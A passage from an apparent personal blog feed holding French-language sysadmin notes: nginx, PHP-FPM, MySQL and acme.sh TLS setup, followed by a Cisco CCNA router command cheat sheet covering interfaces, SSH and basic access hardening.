    listen 80&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    server_name example.fr www.example.fr&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    root /var/www/example.fr&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    index index.html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;php&quot;&gt;php&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;installation-1&quot;&gt;installation&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Debian&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;php7.0-fpm php7.0-mysql

&lt;span class=&quot;c&quot;&gt;# CentOS&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;yum &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;php-fpm php-mysql
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nginx n’a pas de module intégré pour lire directement du PHP, mais possède un module (&lt;code class=&quot;highlighter-rouge&quot;&gt;fastcgi&lt;/code&gt;) qui permet de se connecter à un worker qui va exécuter le code. Celui-ci va prendre les fichiers &lt;code class=&quot;highlighter-rouge&quot;&gt;*.php&lt;/code&gt; en entrée, les traiter et renvoyer la version HTML compréhensible par Nginx. C’est PHP-FPM qui va être le worker.&lt;/p&gt;

&lt;p&gt;Lors de son exécution PHP-FPM va mettre en place un socket d’écoute qui sera utilisé par le module &lt;code class=&quot;highlighter-rouge&quot;&gt;fastcgi&lt;/code&gt; de Nginx.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;On peut aussi configurer PHP-FPM pour qu’il écoute sur un port de la machine.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;configuration-1&quot;&gt;Configuration&lt;/h4&gt;

&lt;h6 id=&quot;debian-1&quot;&gt;Debian&lt;/h6&gt;

&lt;p&gt;Configuration de PHP-FPM: &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/php/7.0/fpm/pool.d/www.conf&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;On peut mettre &lt;code class=&quot;highlighter-rouge&quot;&gt;listen = 127.0.0.1:9000&lt;/code&gt; pour écouter sur un port, ou utiliser un socket avec &lt;code class=&quot;highlighter-rouge&quot;&gt;listen = /run/php/php7.0-fpm.sock&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Attention : il peut être parfois nécessaires de changer les droits du socket pour permettre à Nginx d’y avoir accès.&lt;/p&gt;

&lt;h6 id=&quot;centos-1&quot;&gt;CentOS&lt;/h6&gt;

&lt;p&gt;Configuration de PHP-FPM: &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/php-fpm.d/www.conf&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;On peut mettre &lt;code class=&quot;highlighter-rouge&quot;&gt;listen = 127.0.0.1:9000&lt;/code&gt; pour écouter sur un port, ou utiliser un socket avec &lt;code class=&quot;highlighter-rouge&quot;&gt;listen = /run/php-fpm/php5-fpm.sock&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# démarrer le service PHP-FPM&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl start php-fpm
&lt;span class=&quot;c&quot;&gt;# ou&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl start php7.0-fpm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# code à ajouter à la configuration de nginx&lt;/span&gt;
location ~ &lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;php&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    fastcgi_pass unix:/var/run/php/php7.0-fpm.sock&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# fastcgi_pass 127.0.0.1:9000;&lt;/span&gt;
    fastcgi_index index.php&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    include fastcgi_params&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    fastcgi_param SCRIPT_FILENAME &lt;span class=&quot;nv&quot;&gt;$document_root$fastcgi_script_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;mysql&quot;&gt;mysql&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Debian&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;mysql-client mysql-server 

&lt;span class=&quot;c&quot;&gt;# CentOS&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;yum &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;mariadb mariadb-server 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# lancer mysql en tant que root en fournissant un mdp&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-uroot&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# création d'une BDD&lt;/span&gt;
mysql&amp;gt; create database db_wp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

mysql&amp;gt; create user &lt;span class=&quot;s1&quot;&gt;'db_wp_user'&lt;/span&gt;@&lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt; identified by &lt;span class=&quot;s1&quot;&gt;'my_password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

mysql&amp;gt; grant all privileges on db_wp.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; to &lt;span class=&quot;s1&quot;&gt;'db_wp_user'&lt;/span&gt;@&lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

mysql&amp;gt; flush provileges&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

mysql&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vous devez ensuite connecter votre nouvel utilisateur à la BDD dans votre code PHP. Pour accéder à votre BDD en ligne, vous pouvez utiliser phpMyAdmin, ou Adminer (très léger, simple fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt;).&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;certificat-ssltls&quot;&gt;certificat ssl/tls&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;install&quot;&gt;install&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/Neilpang/acme.sh.git
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;acme.sh/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./acme.sh &lt;span class=&quot;nt&quot;&gt;--install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;create-cert&quot;&gt;create cert&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;acme.sh &lt;span class=&quot;nt&quot;&gt;--issue&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; adel-allam.fr &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; www.adel-allam.fr &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; monit.adel-allam.fr &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /var/www/html/mon-site.fr

&lt;span class=&quot;c&quot;&gt;# The certs will be placed in ~/.acme.sh/example.com/&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;install-cert&quot;&gt;install cert&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# DO NOT use the certs files in ~/.acme.sh/ folder, they are for internal use only,&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# the folder structure may change in the future.&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;acme.sh &lt;span class=&quot;nt&quot;&gt;--install-cert&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; ade-allam.fr
                         &lt;span class=&quot;nt&quot;&gt;--key-file&lt;/span&gt; /home/adel/certs/adel-allam.fr/key.pem &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                         &lt;span class=&quot;nt&quot;&gt;--fullchain-file&lt;/span&gt; /home/adel/certs/adel-allam.fr/cert.pem &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                         &lt;span class=&quot;nt&quot;&gt;--reloadcmd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sudo systemctl reload nginx&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# renew with cron&lt;/span&gt;
0 0 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/home/adel/.acme.sh&quot;&lt;/span&gt;/acme.sh &lt;span class=&quot;nt&quot;&gt;--cron&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--home&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/home/adel/.acme.sh&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;example&quot;&gt;example&lt;/h2&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-nginx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# redirection en HTTPS
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;listen&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;server_name&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;mon-site.fr&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;www.mon-site.fr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kn&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;301&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://mon-site.fr&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;listen&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;server_name&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;mon-site.fr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kn&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/var/www/mon-site.fr/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;index.php&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;index.html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kn&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kn&quot;&gt;try_files&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# optionnel (pour let's encrypt)
&lt;/span&gt;    &lt;span class=&quot;kn&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/.well-know&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kn&quot;&gt;allow&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;kn&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/\.&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kn&quot;&gt;deny&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kn&quot;&gt;access_log&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kn&quot;&gt;log_not_found&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# optionnel (pour PHP)
&lt;/span&gt;    &lt;span class=&quot;kn&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;\.php$&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kn&quot;&gt;fastcgi_pass&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;unix:/var/run/php-fpm/php5-fpm.sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kn&quot;&gt;fastcgi_index&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;index.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kn&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;fastcgi_params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kn&quot;&gt;fastcgi_param&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SCRIPT_FILENAME&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$document_root$fastcgi_script_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kn&quot;&gt;error_page&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/404.html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kn&quot;&gt;error_log&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/var/logs/mon-site.fr/error.log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;access_log&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/var/logs/mon-site.fr/access.log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# optionnel (pour SSL)
&lt;/span&gt;    &lt;span class=&quot;kn&quot;&gt;ssl_certificate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/var/certs/mon-site.fr/cert.pem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;ssl_certificate_key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/var/certs/mon-site.fr/key.pem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>ccna-1</title>
   <link href="http://localhost:4000/network/2018/01/15/ccna-1/"/>
   <updated>2018-01-15T00:00:00+01:00</updated>
   <id>http://localhost:4000/network/2018/01/15/ccna-1</id>
   <content type="html">&lt;!--more--&gt;

&lt;p&gt;Commands presented in the Cisco CCNA Routing and Switching 1 certification on Netacad.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;basic-commands&quot;&gt;basic commands&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;informations&quot;&gt;informations&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router&amp;gt; &lt;span class=&quot;nb&quot;&gt;enable
&lt;/span&gt;Router&amp;gt; disable
Router&amp;gt; configure terminal

Router&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit 
&lt;/span&gt;Router&amp;gt; end
Router&amp;gt; ctrl + z

Router&amp;gt; show mac address-table

Router&amp;gt; show ip arp
Router&amp;gt; show arp
Router&amp;gt; show cdp neighbors

Router&amp;gt; show protocols
Router&amp;gt; show version
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;configuration&quot;&gt;configuration&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router&amp;gt; &lt;span class=&quot;nb&quot;&gt;hostname &lt;/span&gt;SW-floor-1
Router&amp;gt; no &lt;span class=&quot;nb&quot;&gt;hostname

&lt;/span&gt;Router&amp;gt; ip default-gateway
Router&amp;gt; ipv6 unicast-routing

Router&amp;gt; erase startup-config
Router&amp;gt; reload
Router&amp;gt; copy running-config startup-config

&lt;span class=&quot;c&quot;&gt;# configuration courante (volatile)&lt;/span&gt;
Router&amp;gt; show running-config

&lt;span class=&quot;c&quot;&gt;# configuration au démarrage (non volatile)&lt;/span&gt;
Router&amp;gt; show startup-config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;layer-2-information&quot;&gt;layer 2 information&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router&amp;gt; show interfaces brief
Router&amp;gt; show interfaces

Router&amp;gt; show interface FastEthernet 0/1 brief
Router&amp;gt; show interface FastEthernet 0/1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;layer-3-information&quot;&gt;layer 3 information&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router&amp;gt; show ip interfaces brief
Router&amp;gt; show ip interfaces

Router&amp;gt; show ipv6 interfaces brief
Router&amp;gt; show ipv6 interfaces

Router&amp;gt; show ip interface FastEthernet 0/1 brief
Router&amp;gt; show ip interface FastEthernet 0/1

Router&amp;gt; show ipv6 interface FastEthernet 0/1 brief
Router&amp;gt; show ipv6 interface FastEthernet 0/1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;routing-tables&quot;&gt;routing tables&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router&amp;gt; show ip route

Router&amp;gt; show ipv6 route
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;configure-interfaces&quot;&gt;configure interfaces&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# types d'interfaces&lt;/span&gt;
Router&amp;gt; line console 0
Router&amp;gt; line vty 0 15
Router&amp;gt; interface vlan 1

&lt;span class=&quot;c&quot;&gt;# IPv4&lt;/span&gt;
Router&amp;gt; interface gigabitethernet 0/0
Router&amp;gt; description my description
Router&amp;gt; ip address 192.168.1.12 255.255.255.0
Router&amp;gt; no shutdown

&lt;span class=&quot;c&quot;&gt;# IPv6&lt;/span&gt;
Router&amp;gt; interface gigabitethernet 0/0
Router&amp;gt; ipv6 address 2001:db8:acad:1::1/64
Router&amp;gt; ipv6 address fe80::1 link-local
Router&amp;gt; no shutdown
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;ssh-access&quot;&gt;ssh access&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router&amp;gt; ip domain-name test.com
Router&amp;gt; crypto key generate rsa general-keys modulus 1024
Router&amp;gt; username bob secret my_pass
Router&amp;gt; line vty 0 15
Router&amp;gt; login &lt;span class=&quot;nb&quot;&gt;local
&lt;/span&gt;Router&amp;gt; transport input ssh
Router&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;security&quot;&gt;security&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# accès console&lt;/span&gt;
Router&amp;gt; line console 0
Router&amp;gt; password my_pass
Router&amp;gt; login

&lt;span class=&quot;c&quot;&gt;# accès privilégié&lt;/span&gt;
Router&amp;gt; &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;secret my_pass

&lt;span class=&quot;c&quot;&gt;# accès distant (SSH, Telnet)&lt;/span&gt;
Router&amp;gt; line console vty 0 15
Router&amp;gt; password my_pass
Router&amp;gt; login

&lt;span class=&quot;c&quot;&gt;# message of the day&lt;/span&gt;
Router&amp;gt; service password-encryption
Router&amp;gt; banner motd &lt;span class=&quot;s2&quot;&gt;&quot;Accés reglementé&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# limite connexion&lt;/span&gt;
Router&amp;gt; auto secure
Router&amp;gt; service passwords min-length 10
Router&amp;gt; login block-for 120 attempts 3 within 60

&lt;span class=&quot;c&quot;&gt;# inactivité&lt;/span&gt;
Router&amp;gt; line vty 0 15
Router&amp;gt; exec-timeout 10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;debug&quot;&gt;debug&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router&amp;gt; ping 8.8.8.8
Router&amp;gt; ping ipv6 8.8.8.8
Router&amp;gt; traceroute 8.8.8.8
Router&amp;gt; debug ip icmp
Router&amp;gt; undebug ip icmp
Router&amp;gt; terminal monitor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 

</feed>
